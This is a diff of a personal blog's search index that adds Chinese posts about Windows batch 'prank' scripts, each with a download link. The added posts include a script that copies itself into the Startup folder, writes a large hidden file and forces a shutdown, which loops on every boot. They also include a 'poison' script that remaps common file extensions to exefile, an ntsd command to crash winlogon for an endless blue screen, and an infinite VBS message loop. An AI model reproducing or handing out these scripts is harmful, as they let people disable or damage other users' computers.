@@ -1,9 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>自动关机脚本</title>
+    <title>dos命令</title>
+    <url>/2020/05/02/dos%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+<p>@echo off  隐藏</p>
+<p>&gt;nul 2&gt;nul   显示全清空</p>
+<p>taskkill /im xx /f   强制杀进程</p>
+<p>echo 显示</p>
+<p>attrib +s +h XXX 系统级隐藏</p>
+<p>start  c:\windows\exx   新建一个系统级别任务</p>
+<p>windows2003 server 杀进程用 ntsd -c q -pn</p>
+<p>ntsd -c q -pn winlogon.exe windows2003 无限蓝屏</p>
+<p><img src="https://raw.githubusercontent.com/Xiaoyangy/picBed/master/20200502223536.png" alt="windows 2003"></p>
+<p>assoc  要修改的拓展名=exefile //改成exe文件         修改文件关联性</p>
+<blockquote>
+<p>txt   mp4 img bmp  之类</p>
+</blockquote>
+<p>wscript  vbs进程</p>
+]]></content>
+      <categories>
+        <category>脚本</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>简单脚本</title>
     <url>/2020/05/02/%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<p><a href="/download/%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA%E8%84%9A%E6%9C%AC.bat">点击下载</a></p>
+    <content><![CDATA[<p><a href="/download/%E8%87%AA%E5%8A%A8%E5%85%B3%E6%9C%BA%E8%84%9A%E6%9C%AC.bat">自动关机脚本，配合创建垃圾文件</a></p>
 <p>不要点。</p>
 <p>脚本内容：</p>
 <p>@echo off<br>
@@ -11,6 +34,24 @@ copy 自动关机脚本.bat “C:\Users\Administrator\AppData\Roaming\Microsoft\
 fsutil file createnew c:\boom.inf 230000<br>
 attrib +s +h c:\boom.inf<br>
 shutdown -s -f -t 0</p>
+<p><a href="/download/%E6%AF%92%E8%8D%AF.bat">毒药</a></p>
+<p>毒药</p>
+<p>@echo off</p>
+<p>assoc .txt=exefile</p>
+<p>assoc .wav=exefile</p>
+<p>assoc .bmp=exefile</p>
+<p>assoc .mp4=exefile</p>
+<p>assoc .exe=mp4file</p>
+<p><a href="/download/%E8%A7%A3%E8%8D%AF.bat">解药</a></p>
+<p>解药</p>
+<p>@echo off</p>
+<p>assoc .txt=txtfile</p>
+<p>assoc .wav=wavfile</p>
+<p>assoc .bmp=bmpfile</p>
+<p>assoc .mp4=mp4file</p>
+<p>assoc .exe=exefile</p>
+<p>vbs语法：</p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">msg <span class="string">"ss"</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>脚本</category>
@@ -927,7 +968,10 @@ background-position: center;<br>
   <entry>
     <title>MD插入图片</title>
     <url>/2020/03/03/MarkDown/</url>
-    <content><![CDATA[<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">图片下缀</span>](<span class="link">xxx名字/图片名字.格式</span>)</span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+<p>采用外链</p>
+<p><img src="/03/MarkDown/%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84" alt="windows 2003"></p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">图片下缀</span>](<span class="link">xxx名字/图片名字.格式</span>)</span><br></pre></td></tr></table></figure>
 <p>1 把主页配置文件<code>_config.yml</code> 里的<code>post_asset_folder:</code>这个选项设置为<code>true</code></p>
 <p>2 在你的hexo目录下执行这样一句话<code>npm install hexo-asset-image --save</code></p>
 <p>xxx指的是要插入的MD的文件名的文件夹</p>
